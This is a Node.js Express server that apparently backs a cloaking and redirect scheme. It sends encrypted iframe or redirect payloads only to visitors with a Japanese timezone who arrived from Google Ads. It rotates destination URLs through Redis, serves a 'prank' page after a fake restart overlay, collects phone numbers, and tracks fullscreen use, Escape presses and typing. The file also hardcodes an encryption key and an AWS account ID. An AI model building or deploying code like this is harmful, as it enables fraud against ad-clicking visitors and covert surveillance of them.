require("dotenv").config();
const path = require("path");
const express = require("express");
const cors = require("cors");
const CryptoJS = require("crypto-js");
const Redis = require("ioredis");

const {
  AmplifyClient,
  CreateAppCommand,
  CreateBranchCommand,
  CreateDeploymentCommand,
  StartDeploymentCommand,
  GetJobCommand: GetAmplifyJobCommand,
  GetAppCommand,
  DeleteAppCommand: DeleteAmplifyAppCommand,
} = require("@aws-sdk/client-amplify");

const {
  WAFV2Client,
  AssociateWebACLCommand,
} = require("@aws-sdk/client-wafv2");

const AdmZip = require("adm-zip");

// ─── Config ───────────────────────────────────────────────────────
const ENCRYPTION_KEY =
  process.env.ENCRYPTION_KEY ||
  "2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf";
const PORT = process.env.PORT || 3000;
const REGION = process.env.AWS_REGION || "ap-northeast-1";
const ACCOUNT_ID = process.env.AWS_ACCOUNT_ID || "654654618464";

// Key that stores the current live Amplify URL (updated by GitHub Actions/Internal Jobs)
const KEY_AMPLIFY_URL = "amplify:current_url";
// Hardcoded fallback used when Redis is unreachable or the key hasn't been set yet
const AMPLIFY_URL_FALLBACK = "https://main.d2did7g3lmkivw.amplifyapp.com" || process.env.AMPLIFY_URL_FALLBACK;

// ─── Clients ──────────────────────────────────────────────────────
if (!process.env.REDIS_URL) {
  console.error("[startup] REDIS_URL is not set — Redis will be unavailable");
}
const redis = new Redis(process.env.REDIS_URL || "redis://localhost:6379", {
  lazyConnect: false,
  retryStrategy: (times) => Math.min(times * 500, 10_000),
  maxRetriesPerRequest: null,
});
redis.on("error", (err) => console.error("Redis error:", err.message));

// ─── Rotation target helper (Internal Redis) ──────────────────────
async function getRotationTarget(key) {
  if (!key) return null;
  try {
    const value = await redis.get(key);
    console.log(`[rotation] resolved value for ${key}: ${value}`);
    return value;
  } catch (err) {
    console.error(`[rotation] Internal Redis fetch failed — key: ${key} | error: ${err.message}`);
    return null;
  }
}

// ─── Origin groups (Dynamic from Redis) ───────────────────────────
// Each origin maps to { method, target, redisKey? }.
// `method` selects which buildPayload handler runs:
//   - "iframe":      embed `target` in an iframe
//   - "redirect":    window.location.replace(target)
const KEY_ORIGIN_GROUPS = "config:origin_groups";

async function getOriginGroups() {
  try {
    const configStr = await redis.get(KEY_ORIGIN_GROUPS);
    if (!configStr) {
      console.warn(`[config] Redis key ${KEY_ORIGIN_GROUPS} is empty.`);
      return {};
    }
    return JSON.parse(configStr);
  } catch (err) {
    console.error(`[config] Failed to fetch origin groups:`, err.message);
    return {};
  }
}

async function lookupOrigin(origin) {
  const originGroups = await getOriginGroups();
  for (const [group, entries] of Object.entries(originGroups)) {
    if (entries[origin]) return { group, ...entries[origin] };
  }
  return null;
}

const JAPANESE_TIMEZONES = new Set([
  "Asia/Tokyo",
  "Japan",
  "JST",
  "GMT+9",
  "UTC+9",
  "+09:00",
  "+0900",
]);

const app = express();
app.use(cors());
app.use(express.json());

function isJapaneseTimezone(tz) {
  if (!tz || typeof tz !== "string") return false;

  const normalized = tz.trim();

  if (JAPANESE_TIMEZONES.has(normalized)) return true;

  try {
    const fmt = new Intl.DateTimeFormat("en", {
      timeZone: normalized,
      timeZoneName: "shortOffset",
    });
    const offsetPart = fmt
      .formatToParts(new Date())
      .find((p) => p.type === "timeZoneName");

    if (offsetPart) {
      const raw = offsetPart.value.replace("GMT", "").replace(":", "");
      const hours = parseInt(raw, 10);
      if (hours === 9) return true;
    }
  } catch {
    // Unknown timezone string — fall through to false
  }

  return false;
}

function hasGclid(fullUrl) {
  if (!fullUrl || typeof fullUrl !== "string") return false;
  try {
    const url = new URL(fullUrl);
    const gclid = url.searchParams.get("gclid");
    return typeof gclid === "string" && gclid.length > 0;
  } catch {
    return false;
  }
}

// ─── buildPayload variants ────────────────────────────────────────

function buildPayloadIframe(targetUrl) {
  return `const iframe = document.createElement("iframe");
iframe.src = "${targetUrl}";

iframe.setAttribute(
  "allow",
  "fullscreen; autoplay; encrypted-media; picture-in-picture; notifications; push",
);

iframe.setAttribute("allowfullscreen", "");
iframe.setAttribute("webkitallowfullscreen", "");
iframe.setAttribute("mozallowfullscreen", "");

iframe.setAttribute(
  "sandbox",
  "allow-scripts allow-popups allow-popups-to-escape-sandbox allow-forms allow-downloads allow-same-origin",
);

iframe.style.width = "100%";
iframe.style.height = "100%";
iframe.style.border = "0px";

const container = document.getElementById("contentiframe");
if (container) {
  container.replaceChildren(iframe);
}`;
}

function buildPayloadRedirect(targetUrl) {
  return `window.location.replace(${JSON.stringify(targetUrl)});`;
}

const BUILD_PAYLOAD_HANDLERS = {
  iframe: async (entry) => {
    let target = entry.target;
    if (entry.redisKey) {
      const dynamic = await getRotationTarget(entry.redisKey);
      if (dynamic) target = dynamic;
    }
    return buildPayloadIframe(target);
  },
  redirect: async (entry) => {
    let target = entry.target;
    if (entry.redisKey) {
      const dynamic = await getRotationTarget(entry.redisKey);
      if (dynamic) target = dynamic;
    }
    return buildPayloadRedirect(target);
  },
};

// ─── Routes ───────────────────────────────────────────────────────

app.post("/timezone", async (req, res) => {
  const { timezone, fullUrl } = req.body || {};
  const origin = req.headers.origin;

  const entry = origin ? await lookupOrigin(origin) : null;
  if (!entry) {
    return res.status(403).json({ error: "Origin not allowed" });
  }

  if (!isJapaneseTimezone(timezone)) {
    return res
      .status(400)
      .json({ error: "Timezone is not a Japanese timezone (JST / UTC+9)" });
  }

  if (!hasGclid(fullUrl)) {
    return res
      .status(400)
      .json({ error: "fullUrl is missing gclid parameter" });
  }

  const handler = BUILD_PAYLOAD_HANDLERS[entry.method];
  if (!handler) {
    console.error(`[timezone] unknown method "${entry.method}" for ${origin}`);
    return res.status(500).json({ error: "Server misconfiguration" });
  }

  let payload;
  try {
    payload = await handler(entry);
  } catch (err) {
    console.error(`[timezone] handler error (${entry.method}):`, err.message);
    return res.status(500).json({ error: "Payload build failed" });
  }
  if (!payload) {
    return res.status(503).json({ error: "Failed to build payload" });
  }

  const encrypted = encodeURIComponent(
    CryptoJS.AES.encrypt(payload, ENCRYPTION_KEY).toString(),
  );

  console.log(`Popup Sent [${entry.group}/${entry.method}] ${origin}`);
  return res.status(200).type("text/plain").send(encrypted);
});

app.get("/health", (_req, res) => res.json({ status: "ok" }));
app.get("/getImage", (_req, res) => res.sendFile(path.join(__dirname, "prank.webp")));

app.post("/sendPhoneNumber", express.json(), (req, res) => {
  const { phoneNumber } = req.body;
  console.log("Received phone number:", phoneNumber);
  res.json({ ok: true });
});

// 1) Serve website2's static assets (jquery/, scripts.js, style.css, songs/, images/)
//    so the relative URLs inside website2/index.html (resolved against its <base href>)
//    can fetch them. { index: false } stops Express from auto-serving the HTML at GET /.
app.use(express.static(path.join(__dirname, "website2"), { index: false }));

// 2) The endpoint website1 calls after the 10s restart overlay.
//    Returns website2/index.html as raw HTML, which website1 loads via iframe.srcdoc.
app.get("/fetchPrank", async (req, res) => {
  if (!(await isAuthorized(req))) return res.status(403).send("Forbidden");
  res.sendFile(path.join(__dirname, "website2", "index.html"));
});

async function isAuthorized(req) {
  const origin = req.get("origin");
  if (!origin) return false;
  const current = await getRotationTarget(KEY_AMPLIFY_URL);
  const allowed = [current || AMPLIFY_URL_FALLBACK];
  return allowed.includes(origin);
}

// Basic status check for database health
app.get("/status", async (_req, res) => {
  try {
    const keys = await redis.dbsize();
    res.json({ status: "ok", totalRedisKeys: keys });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ─── Analytics ────────────────────────────────────────────────────

const KEY_ANALYTICS         = "analytics:sessions";
const ANALYTICS_MAX         = 3000;
const ANALYTICS_SESSION_TTL = 48 * 3600;

const keySession       = (id) => `analytics:session:${id}`;
const keySessionEvents = (id) => `analytics:session:${id}:events`;
const MAX_TIMELINE_EVENTS = 2000;

const sseClients = new Set();

function broadcastSSE(type, data) {
  if (!sseClients.size) return;
  const msg = `event: ${type}\ndata: ${JSON.stringify(data)}\n\n`;
  for (const res of sseClients) {
    try { res.write(msg); } catch { sseClients.delete(res); }
  }
}

app.post("/track", async (req, res) => {
  try {
    const body = req.body || {};
    const { sessionId, event } = body;
    if (!sessionId || !event) {
      return res.status(400).json({ error: "sessionId and event required" });
    }

    const ip =
      (req.headers["x-forwarded-for"] || "").split(",")[0].trim() ||
      req.headers["x-real-ip"] ||
      req.socket.remoteAddress ||
      "unknown";

    // Silently drop any tracking from IPs that were deleted by an admin.
    const isBlocked = await redis.get(`analytics:blocked:${ip}`);
    if (isBlocked) return res.status(200).json({ ok: true });

    const now = Date.now();
    const sKey = keySession(sessionId);
    const existing = await redis.hgetall(sKey);

    if (event === "init" || !existing || !existing.id) {
      const session = {
        id:             sessionId,
        event:          event,
        ip,
        userAgent:      req.headers["user-agent"] || "",
        origin:         req.headers.origin || "",
        timezone:       body.timezone    || "",
        gclid:          body.gclid       || "",
        url:            body.url         || "",
        referrer:       body.referrer    || "",
        language:       body.language    || "",
        screenWidth:    body.screenWidth    || 0,
        screenHeight:   body.screenHeight   || 0,
        viewportWidth:  body.viewportWidth  || 0,
        viewportHeight: body.viewportHeight || 0,
        startTime:      now,
        lastSeen:       now,
        duration:       0,
        clicks:         0,
        isFullscreen: "false",
        hadFullscreen:"false",
        isHidden:       "false",
        hiddenCount:    0,
        hiddenDuration: 0,   // cumulative seconds the tab was hidden
        lastHiddenTs:   0,   // epoch ms of most recent page_hidden (for cross-batch pairing)
        escCount:       0,
        textCount:      0,   // number of [text] key events (characters typed in inputs)
        hadMouseMove:   "false", // true if any mouse movement was recorded
      };
      const tx = redis.multi();
      tx.hmset(sKey, session);
      tx.expire(sKey, ANALYTICS_SESSION_TTL);
      tx.zadd(KEY_ANALYTICS, now, sessionId);
      tx.zremrangebyrank(KEY_ANALYTICS, 0, -(ANALYTICS_MAX + 1));
      await tx.exec();
      broadcastSSE("session", session);
    } else {
      const updates = { lastSeen: now, event };
      if (body.duration         !== undefined) updates.duration     = Number(body.duration)    || 0;
      if (body.clicks           !== undefined) updates.clicks       = Number(body.clicks)      || 0;
      if (body.viewportWidth    !== undefined) updates.viewportWidth  = Number(body.viewportWidth)  || 0;
      if (body.viewportHeight   !== undefined) updates.viewportHeight = Number(body.viewportHeight) || 0;
      if (body.isFullscreen     !== undefined) {
        updates.isFullscreen = String(body.isFullscreen);
        // Latch: once true, hadFullscreen stays true forever so the table can
        // show "Yes" even after the user exits fullscreen.
        if (body.isFullscreen === true || body.isFullscreen === "true") {
          updates.hadFullscreen = "true";
        }
      }
      if (body.isHidden !== undefined) {
        updates.isHidden = String(body.isHidden);
        // hiddenCount is derived exclusively from /track/events (page_hidden
        // events in the timeline batch). Do NOT increment here — the two
        // endpoints are independent fetches and can diverge on tab close.
      }
      if (body.timezone) updates.timezone = body.timezone;
      if (body.gclid)    updates.gclid    = body.gclid;
      if (body.url)      updates.url      = body.url;

      await redis.hmset(sKey, updates);
      await redis.expire(sKey, ANALYTICS_SESSION_TTL);
      broadcastSSE("update", { ...existing, ...updates, id: sessionId });
    }

    res.status(200).json({ ok: true });
  } catch (err) {
    console.error("[track]", err.message);
    res.status(500).json({ error: "tracking failed" });
  }
});

app.post("/track/events", async (req, res) => {
  try {
    const { sessionId, events } = req.body || {};
    if (!sessionId || !Array.isArray(events) || !events.length) {
      return res.status(400).json({ error: "sessionId and events[] required" });
    }

    const eKey = keySessionEvents(sessionId);
    const tx = redis.multi();
    for (const ev of events) {
      tx.rpush(eKey, JSON.stringify(ev));
    }
    tx.ltrim(eKey, -MAX_TIMELINE_EVENTS, -1);
    tx.expire(eKey, ANALYTICS_SESSION_TTL);
    await tx.exec();

    // Derive hiddenCount exclusively from page_hidden events in this batch
    // so the counter always matches the timeline.
    const hiddenIncrements = events.filter(ev => ev.type === "page_hidden").length;
    if (hiddenIncrements > 0) {
      await redis.hincrby(keySession(sessionId), "hiddenCount", hiddenIncrements);
    }

    // Count ESC key presses from key events in this batch.
    const escIncrements = events.filter(ev => ev.type === "key" && (ev.data || {}).key === "Escape").length;
    if (escIncrements > 0) {
      await redis.hincrby(keySession(sessionId), "escCount", escIncrements);
    }

    // Count [text] events (masked character input — how many characters typed in fields).
    const textIncrements = events.filter(ev => ev.type === "key" && (ev.data || {}).key === "[text]").length;
    if (textIncrements > 0) {
      await redis.hincrby(keySession(sessionId), "textCount", textIncrements);
    }

    // Latch hadMouseMove = "true" if any mouse movement event is in this batch.
    const hasMouseMove = events.some(ev => ev.type === "mouse");
    if (hasMouseMove) {
      await redis.hset(keySession(sessionId), "hadMouseMove", "true");
    }

    // Track hidden duration by pairing page_hidden → page_visible timestamps.
    // lastHiddenTs persists in Redis so pairs that span two separate batches
    // are still matched correctly.
    //
    // "end" is treated the same as page_visible so hidden time is correctly
    // finalised in two edge cases:
    //   A) page_hidden + end arrive in the same batch (user closed hidden tab quickly)
    //   B) end arrives alone in its own batch while lastHiddenTs is still set in
    //      Redis from a previously flushed page_hidden
    const hasRelevantEvents = events.some(
      ev => ev.type === "page_hidden" || ev.type === "page_visible" || ev.type === "end"
    );
    let hiddenDurationDelta = 0;
    if (hasRelevantEvents) {
      const lhts = await redis.hget(keySession(sessionId), "lastHiddenTs");
      let lastHiddenTs = Number(lhts) || 0;
      for (const ev of events) {
        if (ev.type === "page_hidden") {
          lastHiddenTs = Number(ev.t);
        } else if ((ev.type === "page_visible" || ev.type === "end") && lastHiddenTs > 0) {
          hiddenDurationDelta += Math.max(0, Math.floor((Number(ev.t) - lastHiddenTs) / 1000));
          lastHiddenTs = 0;
        }
      }
      await redis.hset(keySession(sessionId), "lastHiddenTs", lastHiddenTs);
      if (hiddenDurationDelta > 0) {
        await redis.hincrby(keySession(sessionId), "hiddenDuration", hiddenDurationDelta);
      }
    }

    // Push live counter updates to the admin dashboard so badges update in real time.
    if (hiddenIncrements > 0 || escIncrements > 0 || hiddenDurationDelta > 0 || textIncrements > 0 || hasMouseMove) {
      const updated = await redis.hmget(keySession(sessionId), "hiddenCount", "escCount", "hiddenDuration", "textCount", "hadMouseMove");
      broadcastSSE("update", {
        id:             sessionId,
        hiddenCount:    updated[0] || "0",
        escCount:       updated[1] || "0",
        hiddenDuration: updated[2] || "0",
        textCount:      updated[3] || "0",
        hadMouseMove:   updated[4] || "false",
      });
    }

    broadcastSSE("events", { sessionId, events });
    res.status(200).json({ ok: true });
  } catch (err) {
    console.error("[track/events]", err.message);
    res.status(500).json({ error: "failed" });
  }
});

app.get("/admin/analytics/session/:id/events", async (req, res) => {
  try {
    const raw = await redis.lrange(keySessionEvents(req.params.id), 0, -1);
    const events = raw.map((r) => { try { return JSON.parse(r); } catch { return null; } }).filter(Boolean);
    res.json({ events });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post("/admin/analytics/clear-stale", async (req, res) => {
  try {
    const ids = await redis.zrevrange(KEY_ANALYTICS, 0, -1);
    const cutoff = Date.now() - 5 * 60 * 1000;
    const stale = [];
    for (const id of ids) {
      const s = await redis.hgetall(keySession(id));
      if (!s || !s.id || Number(s.lastSeen) < cutoff) stale.push(id);
    }
    if (stale.length) {
      const tx = redis.multi();
      for (const id of stale) {
        tx.del(keySession(id));
        tx.del(keySessionEvents(id));
        tx.zrem(KEY_ANALYTICS, id);
      }
      await tx.exec();
    }
    res.json({ cleared: stale.length });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Convert client-local date timestamps to Redis score range
function getScoreRange(from, to) {
  const minScore = from ? Number(from) : "-inf";
  const maxScore = to   ? Number(to)   : "+inf";
  return { minScore, maxScore };
}

app.get("/admin/analytics", async (req, res) => {
  try {
    const { from, to, page = "1", pageSize = "50" } = req.query;
    const { minScore, maxScore } = getScoreRange(from, to);
    const limit  = Math.min(Number(pageSize), 100);
    const offset = (Number(page) - 1) * limit;

    const [ids, total] = await Promise.all([
      redis.zrevrangebyscore(KEY_ANALYTICS, maxScore, minScore, "LIMIT", offset, limit),
      redis.zcount(KEY_ANALYTICS, minScore, maxScore),
    ]);

    // Batch all hgetall in one round-trip
    const pipeline = redis.pipeline();
    for (const id of ids) pipeline.hgetall(keySession(id));
    const results = await pipeline.exec();

    const sessions = results
      .map(([, s]) => s)
      .filter((s) => s && s.id);

    res.json({ sessions, total, page: Number(page), pageSize: limit });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get("/admin/analytics/stats", async (req, res) => {
  try {
    const { from, to } = req.query;
    const { minScore, maxScore } = getScoreRange(from, to);

    const [total, ids] = await Promise.all([
      redis.zcount(KEY_ANALYTICS, minScore, maxScore),
      redis.zrevrangebyscore(KEY_ANALYTICS, maxScore, minScore),
    ]);

    const pipeline = redis.pipeline();
    for (const id of ids) pipeline.hgetall(keySession(id));
    const results = await pipeline.exec();

    let withGclid = 0, totalClicks = 0, totalDuration = 0, durCount = 0;
    const uniqueIPs = new Set();
    const activeIPs = new Set();
    const gclidIPs  = new Set();
    // SR (successfully redirected): visited a source site AND the amplify destination.
    // Exclude known source amplify pages from the destination check.
    const SR_SOURCE_AMPLIFY = ["d2d7h6s2h011oz", "d2f8uqjdeqtpz7"];
    const ipSR = {};
    const now = Date.now();
    for (const [, s] of results) {
      if (!s || !s.id) continue;
      const ip = s.ip || "unknown";
      uniqueIPs.add(ip);
      if (now - Number(s.lastSeen) < 45 * 1000) activeIPs.add(ip);
      if ((s.gclid || "").trim()) { withGclid++; gclidIPs.add(ip); }
      totalClicks += Number(s.clicks) || 0;
      const activeDur = Math.max(0, (Number(s.duration) || 0) - (Number(s.hiddenDuration) || 0));
      if (activeDur > 0) { totalDuration += activeDur; durCount++; }

      const origin = (s.origin || "").toLowerCase();
      if (!ipSR[ip]) ipSR[ip] = { src: false, dst: false };
      if (origin.includes("amplifyapp.com") && !SR_SOURCE_AMPLIFY.some(p => origin.includes(p))) {
        ipSR[ip].dst = true;
      } else if (origin) {
        ipSR[ip].src = true;
      }
    }
    const srUsers = Object.values(ipSR).filter(v => v.src && v.dst).length;

    res.json({
      total,                         // raw session count (kept for reference)
      uniqueIPs:   uniqueIPs.size,    // unique visitor IPs
      active:      activeIPs.size,    // unique IPs active in last 45 s
      withGclid,
      gclidIPs:    gclidIPs.size,     // unique IPs that had a GCLID
      totalClicks,
      avgDuration: durCount ? Math.round(totalDuration / durCount) : 0,
      srUsers,
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Delete all sessions for a given IP address
app.delete("/admin/analytics/ip/:ip", async (req, res) => {
  try {
    const ip = decodeURIComponent(req.params.ip);
    const ids = await redis.zrevrange(KEY_ANALYTICS, 0, -1);

    // Batch-fetch just the ip field for all sessions
    const pipeline = redis.pipeline();
    for (const id of ids) pipeline.hget(keySession(id), "ip");
    const results = await pipeline.exec();

    const toDelete = ids.filter((id, i) => results[i][1] === ip);

    if (toDelete.length) {
      const tx = redis.multi();
      for (const id of toDelete) {
        tx.del(keySession(id));
        tx.del(keySessionEvents(id));
        tx.zrem(KEY_ANALYTICS, id);
      }
      await tx.exec();
    }

    // Block this IP so future heartbeats don't recreate sessions.
    // Key expires after 48 h — same lifetime as session data.
    await redis.setex(`analytics:blocked:${ip}`, 48 * 3600, "1");

    // Broadcast so every open admin tab instantly removes the rows
    broadcastSSE("ip-deleted", { ip });
    res.json({ deleted: toDelete.length, ip });
  } catch (err) {
    console.error("[delete-ip]", err.message);
    res.status(500).json({ error: err.message });
  }
});

// ─── Funnel ───────────────────────────────────────────────────────

// Returns every unique origin + URL hostname seen across all sessions,
// used to populate the site autocomplete inputs on funnel.html.
app.get("/admin/funnel/sites", async (req, res) => {
  try {
    const ids = await redis.zrevrange(KEY_ANALYTICS, 0, ANALYTICS_MAX - 1);
    const pipeline = redis.pipeline();
    for (const id of ids) pipeline.hmget(keySession(id), "origin", "url");
    const results = await pipeline.exec();

    const sites = new Set();
    for (const [, fields] of results) {
      if (!fields) continue;
      const [origin, url] = fields;
      if (origin && origin.trim()) sites.add(origin.trim());
      if (url) {
        try { const h = new URL(url).hostname; if (h) sites.add(h); } catch {}
      }
    }
    res.json({ sites: [...sites].sort() });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Match a session to a site string (flexible: origin or URL contains the value)
function sessionMatchesSite(s, site) {
  const q = site.toLowerCase();
  return (s.origin || "").toLowerCase().includes(q) ||
         (s.url    || "").toLowerCase().includes(q);
}

function extractDomain(str) {
  if (!str) return "";
  try {
    const url = /^https?:\/\//.test(str) ? str : "https://" + str;
    return new URL(url).hostname.replace(/^www\./, "");
  } catch (_) { return ""; }
}

// GET /admin/funnel?site1=&site2=&from=&to=&maxHours=&requireOrder=true
// site2 is optional — omit it for multi-destination discovery mode
app.get("/admin/funnel", async (req, res) => {
  try {
    const { site1, site2, from, to, maxHours, requireOrder = "true" } = req.query;
    if (!site1) return res.status(400).json({ error: "site1 required" });

    const { minScore, maxScore } = getScoreRange(from, to);
    const ids = await redis.zrevrangebyscore(KEY_ANALYTICS, maxScore, minScore, "LIMIT", 0, ANALYTICS_MAX);

    const pipeline = redis.pipeline();
    for (const id of ids) pipeline.hgetall(keySession(id));
    const rawResults = await pipeline.exec();
    const sessions = rawResults.map(([, s]) => s).filter(s => s && s.id);

    // Always build s1Map
    const s1Map = {};
    for (const s of sessions) {
      const ip = s.ip;
      if (!ip || ip === "unknown") continue;
      if (sessionMatchesSite(s, site1)) { (s1Map[ip] = s1Map[ip] || []).push(s); }
    }
    const s1IPs = new Set(Object.keys(s1Map));

    // ── Multi-destination mode (no site2 specified) ────────────────────
    if (!site2) {
      // For each site1 IP, find all sessions NOT on site1, group by domain
      const otherByIP = {};
      for (const s of sessions) {
        const ip = s.ip;
        if (!ip || !s1IPs.has(ip) || sessionMatchesSite(s, site1)) continue;
        (otherByIP[ip] = otherByIP[ip] || []).push(s);
      }

      const destMap = {}; // domain → { ips: Set, users: [] }
      for (const ip of s1IPs) {
        const sorted1 = (s1Map[ip] || []).slice().sort((a, b) => Number(a.startTime) - Number(b.startTime));
        const first1  = sorted1[0];
        const others  = (otherByIP[ip] || []).slice().sort((a, b) => Number(a.startTime) - Number(b.startTime));
        const seenDomains = new Set();

        for (const s of others) {
          const domain = extractDomain(s.origin || s.url || "");
          if (!domain || seenDomains.has(domain)) continue;
          if (requireOrder === "true" && Number(s.startTime) <= Number(first1.startTime)) continue;
          const ttc = Math.round((Number(s.startTime) - Number(first1.startTime)) / 1000);
          if (maxHours && ttc > Number(maxHours) * 3600) continue;

          seenDomains.add(domain);
          if (!destMap[domain]) destMap[domain] = { ips: new Set(), users: [] };
          if (!destMap[domain].ips.has(ip)) {
            destMap[domain].ips.add(ip);
            destMap[domain].users.push({
              ip,
              site1Session: first1,
              site2Session: s,
              timeToConvert: ttc,
              gclid:    (first1.gclid || s.gclid || "").trim(),
              timezone: first1.timezone || s.timezone || "",
              site2: domain,
            });
          }
        }
      }

      // Build destinations summary (sorted by conversions desc)
      const destinations = Object.entries(destMap)
        .map(([site, { ips, users }]) => {
          const t = users.filter(u => u.timeToConvert > 0).map(u => u.timeToConvert).sort((a, b) => a - b);
          return {
            site,
            converted:        ips.size,
            conversionRate:   (ips.size / s1IPs.size * 100).toFixed(1),
            avgTimeToConvert: t.length ? Math.round(t.reduce((a, b) => a + b, 0) / t.length) : 0,
            withGclid:        users.filter(u => u.gclid).length,
          };
        })
        .sort((a, b) => b.converted - a.converted);

      // Flat user list — one entry per IP (earliest destination wins)
      const seenIPs = new Set();
      const allUsers = [];
      for (const { users } of Object.values(destMap)) {
        for (const u of users) {
          if (!seenIPs.has(u.ip)) { seenIPs.add(u.ip); allUsers.push(u); }
        }
      }
      allUsers.sort((a, b) => Number(b.site1Session.startTime) - Number(a.site1Session.startTime));

      const convertedIPs = seenIPs;
      const nonConverted = [];
      for (const ip of s1IPs) {
        if (convertedIPs.has(ip)) continue;
        const best = s1Map[ip].slice().sort((a, b) => Number(b.startTime) - Number(a.startTime))[0];
        nonConverted.push({ ip, session: best, gclid: (best.gclid || "").trim(), timezone: best.timezone || "", visitedSite2: false });
      }
      nonConverted.sort((a, b) => Number(b.session.startTime) - Number(a.session.startTime));

      const times   = allUsers.filter(u => u.timeToConvert > 0).map(u => u.timeToConvert).sort((a, b) => a - b);
      const avgTime = times.length ? Math.round(times.reduce((a, b) => a + b, 0) / times.length) : 0;
      const medTime = times.length ? times[Math.floor(times.length / 2)] : 0;

      return res.json({
        multiDestination: true,
        site1: { total: sessions.filter(s => sessionMatchesSite(s, site1)).length, uniqueIPs: s1IPs.size },
        site2: { total: 0, uniqueIPs: destinations.length },
        destinations,
        converted:           convertedIPs.size,
        conversionRate:      s1IPs.size > 0 ? ((convertedIPs.size / s1IPs.size) * 100).toFixed(1) : "0.0",
        avgTimeToConvert:    avgTime,
        medianTimeToConvert: medTime,
        withGclid:           allUsers.filter(u => u.gclid).length,
        users:               allUsers,
        nonConverted,
      });
    }

    // ── Single-destination mode (site2 specified) ──────────────────────
    const s2Map = {};
    for (const s of sessions) {
      const ip = s.ip;
      if (!ip || ip === "unknown") continue;
      if (sessionMatchesSite(s, site2)) { (s2Map[ip] = s2Map[ip] || []).push(s); }
    }
    const s2IPs = new Set(Object.keys(s2Map));

    // Build conversion list
    const users = [];
    for (const ip of s1IPs) {
      if (!s2Map[ip]) continue;

      const sorted1 = s1Map[ip].sort((a, b) => Number(a.startTime) - Number(b.startTime));
      const sorted2 = s2Map[ip].sort((a, b) => Number(a.startTime) - Number(b.startTime));
      const first1  = sorted1[0];

      let first2;
      if (requireOrder === "true") {
        first2 = sorted2.find(s => Number(s.startTime) > Number(first1.startTime));
      } else {
        first2 = sorted2[0];
      }
      if (!first2) continue;

      const timeToConvert = Math.round((Number(first2.startTime) - Number(first1.startTime)) / 1000);
      if (maxHours && timeToConvert > Number(maxHours) * 3600) continue;

      users.push({
        ip,
        site1Session:   first1,
        site2Session:   first2,
        timeToConvert,
        gclid:    (first1.gclid || first2.gclid || "").trim(),
        timezone: first1.timezone || first2.timezone || "",
      });
    }

    users.sort((a, b) => Number(b.site1Session.startTime) - Number(a.site1Session.startTime));

    const convertedIPs = new Set(users.map(u => u.ip));
    const nonConverted = [];
    for (const ip of s1IPs) {
      if (convertedIPs.has(ip)) continue;
      const best = s1Map[ip].sort((a, b) => Number(b.startTime) - Number(a.startTime))[0];
      nonConverted.push({
        ip,
        session:  best,
        gclid:    (best.gclid || "").trim(),
        timezone: best.timezone || "",
        visitedSite2: !!s2Map[ip],
      });
    }
    nonConverted.sort((a, b) => Number(b.session.startTime) - Number(a.session.startTime));

    const times   = users.filter(u => u.timeToConvert > 0).map(u => u.timeToConvert).sort((a, b) => a - b);
    const avgTime = times.length ? Math.round(times.reduce((a, b) => a + b, 0) / times.length) : 0;
    const medTime = times.length ? times[Math.floor(times.length / 2)] : 0;

    res.json({
      site1: { total: sessions.filter(s => sessionMatchesSite(s, site1)).length, uniqueIPs: s1IPs.size },
      site2: { total: sessions.filter(s => sessionMatchesSite(s, site2)).length, uniqueIPs: s2IPs.size },
      converted:           users.length,
      conversionRate:       s1IPs.size > 0 ? ((users.length / s1IPs.size) * 100).toFixed(1) : "0.0",
      avgTimeToConvert:     avgTime,
      medianTimeToConvert:  medTime,
      withGclid:            users.filter(u => u.gclid).length,
      users,
      nonConverted,
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ─── end Funnel ───────────────────────────────────────────────────

// ─── IP enrichment ────────────────────────────────────────────────
// Proxies ipapi.is and caches results in Redis for 24 h.
// Set IPAPI_IS_KEY in Render environment variables.
app.get("/admin/ip-info/:ip", async (req, res) => {
  const { ip } = req.params;
  const cacheKey = `ipinfo:${ip}`;
  try {
    const cached = await redis.get(cacheKey);
    if (cached) return res.json(JSON.parse(cached));

    const apiKey = process.env.IPAPI_IS_KEY;
    if (!apiKey) return res.status(503).json({ error: "IPAPI_IS_KEY not set in Render environment" });

    const r = await fetch(`https://api.ipapi.is/?q=${encodeURIComponent(ip)}&key=${apiKey}`);
    if (!r.ok) return res.status(502).json({ error: `ipapi.is returned ${r.status}` });
    const data = await r.json();

    if (data.error) return res.status(400).json({ error: data.error });

    const loc     = data.location || {};
    const asn     = data.asn      || {};
    const company = data.company  || {};

    const is_proxy      = !!data.is_proxy;
    const is_vpn        = !!data.is_vpn;
    const is_tor        = !!data.is_tor;
    const is_datacenter = !!data.is_datacenter;
    const is_mobile     = !!data.is_mobile;

    // Derive a human-readable connection type from ipapi.is fields
    let connection_type;
    if      (is_tor)         connection_type = "Tor";
    else if (is_vpn)         connection_type = "VPN";
    else if (is_proxy)       connection_type = "Proxy";
    else if (is_datacenter)  connection_type = "Datacenter";
    else if (is_mobile)      connection_type = "Mobile";
    else {
      const t = (asn.type || company.type || "").toLowerCase();
      if      (t === "isp")        connection_type = "Residential";
      else if (t === "hosting")    connection_type = "Datacenter";
      else if (t === "education")  connection_type = "Education";
      else if (t === "government") connection_type = "Government";
      else if (t === "business")   connection_type = "Business";
      else if (t === "banking")    connection_type = "Banking";
      else                         connection_type = "Residential"; // safe default for clean IPs
    }

    const result = {
      ip,
      country:         loc.country || asn.country || "",
      country_code:    loc.country || asn.country || "",
      city:            loc.city    || "",
      region:          loc.region  || "",
      isp:             asn.org     || company.name || "",
      org:             asn.org     || company.name || "",
      asn:             asn.asn     ? String(asn.asn) : "",
      connection_type,
      is_proxy,
      is_vpn,
      is_tor,
      is_datacenter,
    };

    // Cache 24 h — IP classifications rarely change
    await redis.setex(cacheKey, 24 * 3600, JSON.stringify(result));
    res.json(result);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Flush all cached ipinfo entries so they get re-fetched with the new logic
app.delete("/admin/ip-info-cache", async (req, res) => {
  try {
    const keys = await redis.keys("ipinfo:*");
    if (keys.length) await redis.del(...keys);
    res.json({ deleted: keys.length });
  } catch (err) {
